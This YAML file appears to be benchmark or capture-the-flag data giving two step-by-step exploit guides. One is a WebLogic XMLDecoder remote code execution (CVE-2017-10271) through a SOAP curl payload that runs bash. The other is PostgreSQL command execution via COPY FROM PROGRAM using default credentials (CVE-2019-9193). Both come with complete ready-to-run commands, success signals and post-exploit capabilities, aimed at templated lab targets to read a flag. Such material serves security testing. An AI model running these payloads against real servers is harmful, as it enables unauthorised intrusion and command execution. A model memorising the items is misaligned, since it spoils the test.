targets.exploit_guide:
version: 2
cve_id: CVE-2017-10271
summary: Exploits WebLogic WLS-WSAT XMLDecoder RCE via SOAP request to execute a command
  that copies the flag to a web-accessible path, then retrieves it via HTTP.
target:
  protocol: http
  port: 7001
  service_role: middleware
  endpoints:
  - /wls-wsat/CoordinatorPortType
  - /bea_wls_internal/
preconditions:
  attack_vector: network
  privileges_required: none
  required_service:
    protocol: http
    port: 7001
steps:
- id: step-1
  action: Exploit XMLDecoder RCE to copy flag to web-accessible path
  procedure: Send a SOAP request with an XMLDecoder payload to /wls-wsat/CoordinatorPortType.
    The payload uses java.lang.ProcessBuilder to execute a bash command that copies
    /flag to the bea_wls_internal web application directory.
  command_hint: 'curl -s -X POST http://{{target_ip}}:{{target_port}}/wls-wsat/CoordinatorPortType
    -H "Content-Type: text/xml" -d ''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext
    xmlns:work="http://bea.com/2004/06/soap/workarea/"><void class="java.lang.ProcessBuilder"><array
    class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void
    index="1"><string>-c</string></void><void index="2"><string>cat /flag > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/flag.txt</string></void></array><void
    method="start"/></void></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'''
  depends_on: []
  success_signal: HTTP 500 response with SOAP fault (NoSuchElementException expected)
    indicating payload processed
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-2
  action: Retrieve the flag file via HTTP
  procedure: Fetch the flag file from the bea_wls_internal web application context
    where it was written in the previous step.
  command_hint: curl -s http://{{target_ip}}:{{target_port}}/bea_wls_internal/flag.txt
  depends_on:
  - step-1
  success_signal: HTTP 200 response containing the flag content
  materials: []
  execution:
    scope: actor
    tools:
    - id: curl
      kind: executable
      name: curl
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: root
  capabilities:
  - execute_command
  - read_file
  - write_file
  command_channel:
    type: none
    established_by: []
    invocation_hint: ''
    reusable: false
requirements:
  tools:
  - curl
  materials: []
  authentication: none
  callback: none
evidence_refs:
- verification.native_verification.evidence

version: 2
cve_id: CVE-2019-9193
summary: Authenticated to PostgreSQL with default credentials and achieved remote
  command execution as the postgres user via COPY FROM PROGRAM, then read the flag
  file.
target:
  protocol: postgres
  port: 5432
  service_role: database
  endpoints: []
preconditions:
  attack_vector: network
  privileges_required: admin_credentials
  required_service:
    protocol: postgres
    port: 5432
    authentication: password
steps:
- id: step-1
  action: Authenticate and verify command execution via COPY FROM PROGRAM
  procedure: Connect to the PostgreSQL database using default credentials (postgres/postgres)
    and execute the 'id' command using the COPY FROM PROGRAM feature to verify RCE.
  command_hint: python3 -c "import psycopg2; conn = psycopg2.connect(host='{{target_ip}}',
    port={{target_port}}, user='postgres', password='postgres', dbname='postgres');
    cur = conn.cursor(); cur.execute('DROP TABLE IF EXISTS cmd_exec'); cur.execute('CREATE
    TABLE cmd_exec(cmd_output text)'); cur.execute(\"COPY cmd_exec FROM PROGRAM 'id'\");
    cur.execute('SELECT * FROM cmd_exec'); print(cur.fetchall()[0][0]); conn.commit();
    cur.close(); conn.close()"
  depends_on: []
  success_signal: Output contains 'uid=' and 'gid=' indicating successful command
    execution as the postgres user.
  materials: []
  execution:
    scope: actor
    tools:
    - id: python3
      kind: executable
      name: python3
      runtime: ''
      required: true
      artifact: null
    - id: psycopg2
      kind: python_module
      name: psycopg2
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
- id: step-2
  action: Read flag file via COPY FROM PROGRAM
  procedure: Use the established PostgreSQL connection and COPY FROM PROGRAM to read
    the /flag file.
  command_hint: python3 -c "import psycopg2; conn = psycopg2.connect(host='{{target_ip}}',
    port={{target_port}}, user='postgres', password='postgres', dbname='postgres');
    cur = conn.cursor(); cur.execute('DROP TABLE IF EXISTS cmd_exec'); cur.execute('CREATE
    TABLE cmd_exec(cmd_output text)'); cur.execute(\"COPY cmd_exec FROM PROGRAM 'cat
    /flag'\"); cur.execute('SELECT * FROM cmd_exec'); print(cur.fetchall()[0][0]);
    conn.commit(); cur.close(); conn.close()"
  depends_on:
  - step-1
  success_signal: Output contains the flag string from /flag.
  materials: []
  execution:
    scope: actor
    tools:
    - id: python3
      kind: executable
      name: python3
      runtime: ''
      required: true
      artifact: null
    - id: psycopg2
      kind: python_module
      name: psycopg2
      runtime: ''
      required: true
      artifact: null
    materials: []
    external_download: false
    fallback_ids: []
post_exploit:
  principal: service_user
  capabilities:
  - execute_command
  - read_file
  - write_file
  command_channel:
    type: postgres_copy_from_program
    established_by:
    - step-1
    invocation_hint: 'Execute SQL: COPY <table> FROM PROGRAM ''<command>'''
    reusable: true
requirements:
  tools:
  - python3
  - psycopg2-binary
  materials: []
  authentication: default credentials
  callback: none
evidence_refs:
- verification.native_verification.evidence
